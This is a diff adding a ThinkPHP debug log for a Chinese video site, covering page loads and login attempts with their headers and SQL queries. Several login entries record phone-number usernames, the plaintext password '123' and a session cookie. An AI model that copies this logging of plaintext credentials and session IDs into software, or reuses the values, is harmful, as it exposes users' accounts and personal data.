@@ -1,0 +1,1577 @@
+---------------------------------------------------------------
+[ 2018-02-27T04:35:40+08:00 ] 106.11.225.39 GET /
+[ info ] tp.chenjiangjiang.cn/ [运行时间：0.025440s][吞吐率：39.31req/s] [内存消耗：2,593.84kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'host' => 'tp.chenjiangjiang.cn',
+  'pragma' => 'no-cache',
+  'cache-control' => 'no-cache',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000247s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000639s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000182s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000133s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000123s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000452s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000128s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000405s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000101s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000424s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000110s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000467s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000239s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000201s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000201s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000190s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000176s ]
+---------------------------------------------------------------
+[ 2018-02-27T05:01:55+08:00 ] 117.25.155.178 GET /
+[ info ] tp.chenjiangjiang.cn/ [运行时间：0.024307s][吞吐率：41.14req/s] [内存消耗：2,594.03kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'cache-control' => 'max-age=0',
+  'host' => 'tp.chenjiangjiang.cn',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000215s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000649s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000167s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000132s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000122s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000465s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000127s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000425s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000105s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000426s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000105s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000473s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000148s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000124s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000138s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000114s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000113s ]
+---------------------------------------------------------------
+[ 2018-02-27T10:25:19+08:00 ] 111.206.170.62 GET /
+[ info ] tp.chenjiangjiang.cn/ [运行时间：0.026019s][吞吐率：38.43req/s] [内存消耗：2,593.99kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000221s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000655s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000185s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000155s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000133s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000502s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000134s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000443s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000113s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000437s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000113s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000494s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000157s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000131s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000145s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000121s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000120s ]
+---------------------------------------------------------------
+[ 2018-02-27T10:25:32+08:00 ] 111.206.170.62 POST /index/user/login
+[ info ] tp.chenjiangjiang.cn/index/user/login [运行时间：0.021450s][吞吐率：46.62req/s] [内存消耗：2,561.21kb] [文件加载：55]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=k18c0r38eeod5tch8cuor8fm41; hzy_login_back=',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'upgrade-insecure-requests' => '1',
+  'origin' => 'http://tp.chenjiangjiang.cn',
+  'cache-control' => 'max-age=0',
+  'content-length' => '33',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+)
+[ info ] [ PARAM ] array (
+  'username' => '17611134697',
+  'password' => '123',
+)
+[ info ] [ RUN ] app\index\controller\User->login[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/tpl/dispatch_jump.tpl [ array (
+  0 => 'code',
+  1 => 'msg',
+  2 => 'data',
+  3 => 'url',
+  4 => 'wait',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000204s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_user` [ RunTime:0.000682s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_user` WHERE  `phone` = '17611134697' LIMIT 1 [ RunTime:0.000293s ]
+---------------------------------------------------------------
+[ 2018-02-27T10:25:35+08:00 ] 111.206.170.62 GET /
+[ info ] tp.chenjiangjiang.cn/ [运行时间：0.024233s][吞吐率：41.27req/s] [内存消耗：2,593.91kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=k18c0r38eeod5tch8cuor8fm41; hzy_login_back=',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000229s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000662s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000160s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000146s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000129s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000427s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000137s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000407s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000101s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000443s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000105s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000443s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000182s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000128s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000115s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000112s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000112s ]
+---------------------------------------------------------------
+[ 2018-02-27T10:26:03+08:00 ] 111.206.170.62 POST /index/user/login
+[ info ] tp.chenjiangjiang.cn/index/user/login [运行时间：0.020624s][吞吐率：48.49req/s] [内存消耗：2,561.21kb] [文件加载：55]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=k18c0r38eeod5tch8cuor8fm41; hzy_login_back=',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'upgrade-insecure-requests' => '1',
+  'origin' => 'http://tp.chenjiangjiang.cn',
+  'cache-control' => 'max-age=0',
+  'content-length' => '33',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+)
+[ info ] [ PARAM ] array (
+  'username' => '17611134691',
+  'password' => '123',
+)
+[ info ] [ RUN ] app\index\controller\User->login[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/tpl/dispatch_jump.tpl [ array (
+  0 => 'code',
+  1 => 'msg',
+  2 => 'data',
+  3 => 'url',
+  4 => 'wait',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000226s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_user` [ RunTime:0.000669s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_user` WHERE  `phone` = '17611134691' LIMIT 1 [ RunTime:0.000302s ]
+---------------------------------------------------------------
+[ 2018-02-27T10:26:07+08:00 ] 111.206.170.62 GET /
+[ info ] tp.chenjiangjiang.cn/ [运行时间：0.037307s][吞吐率：26.80req/s] [内存消耗：2,593.91kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=k18c0r38eeod5tch8cuor8fm41; hzy_login_back=',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000289s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.001010s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' LIMIT 1 [ RunTime:0.000234s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5 [ RunTime:0.000214s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_category` WHERE  `pid` = 0  AND `isdel` = '0' ORDER BY `ordeby`  desc LIMIT 5,6 [ RunTime:0.000198s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_banner` [ RunTime:0.000749s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_banner` WHERE  `isdel` = 0 ORDER BY `orderby`  desc [ RunTime:0.000200s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_link` [ RunTime:0.000701s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_link` ORDER BY `order`  asc [ RunTime:0.000159s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_website` [ RunTime:0.000723s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_website` [ RunTime:0.000166s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_video` [ RunTime:0.000818s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `isdel` = '0'  AND `vplay` > 3 [ RunTime:0.000211s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%lp%' [ RunTime:0.000229s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%w_%' [ RunTime:0.000171s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%dnf_%' [ RunTime:0.000178s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_video` WHERE  `vname` LIKE '%qq_%' [ RunTime:0.000204s ]
+---------------------------------------------------------------
+[ 2018-02-27T10:26:16+08:00 ] 111.206.170.62 POST /index/user/login
+[ info ] tp.chenjiangjiang.cn/index/user/login [运行时间：0.028114s][吞吐率：35.57req/s] [内存消耗：2,669.80kb] [文件加载：61]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=k18c0r38eeod5tch8cuor8fm41; hzy_login_back=',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'upgrade-insecure-requests' => '1',
+  'origin' => 'http://tp.chenjiangjiang.cn',
+  'cache-control' => 'max-age=0',
+  'content-length' => '33',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+)
+[ info ] [ PARAM ] array (
+  'username' => '17611134695',
+  'password' => '123',
+)
+[ info ] [ RUN ] app\index\controller\User->login[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/tpl/dispatch_jump.tpl [ array (
+  0 => 'code',
+  1 => 'msg',
+  2 => 'data',
+  3 => 'url',
+  4 => 'wait',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000203s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_user` [ RunTime:0.000675s ]
+[ sql ] [ SQL ] SELECT * FROM `bw_user` WHERE  `phone` = '17611134695' LIMIT 1 [ RunTime:0.000273s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_vip` [ RunTime:0.000450s ]
+[ sql ] [ SQL ] SELECT `gqtime` FROM `bw_vip` WHERE  `uid` = 10 LIMIT 1 [ RunTime:0.000156s ]
+[ sql ] [ SQL ] UPDATE `bw_user`  SET `isvip`=2  WHERE  `id` = 10 [ RunTime:0.004884s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_fwjl` [ RunTime:0.000475s ]
+[ sql ] [ SQL ] INSERT INTO `bw_fwjl` (`uid` , `username` , `ip` , `retime`) VALUES (10 , '17611134695' , '111.206.170.62' , '2018-02-27 10:26:16') [ RunTime:0.000217s ]
+---------------------------------------------------------------
+[ 2018-02-27T10:26:19+08:00 ] 111.206.170.62 GET /index/index/index.html
+[ info ] tp.chenjiangjiang.cn/index/index/index.html [运行时间：0.024469s][吞吐率：40.87req/s] [内存消耗：2,598.46kb] [文件加载：54]
+[ info ] [ LANG ] /home/wwwroot/tp.chenjiangjiang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=k18c0r38eeod5tch8cuor8fm41; hzy_login_back=',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://tp.chenjiangjiang.cn/index/user/login',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'tp.chenjiangjiang.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/wwwroot/tp.chenjiangjiang.cn/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/wwwroot/tp.chenjiangjiang.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'data1',
+  1 => 'data2',
+  2 => 'data3',
+  3 => 'data',
+  4 => 'wzxx',
+  5 => 'banvideo',
+  6 => 'lpl',
+  7 => 'wz',
+  8 => 'dnf',
+  9 => 'qq',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000210s ] mysql:host=localhost;dbname=bw;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `bw_category` [ RunTime:0.000701s ]
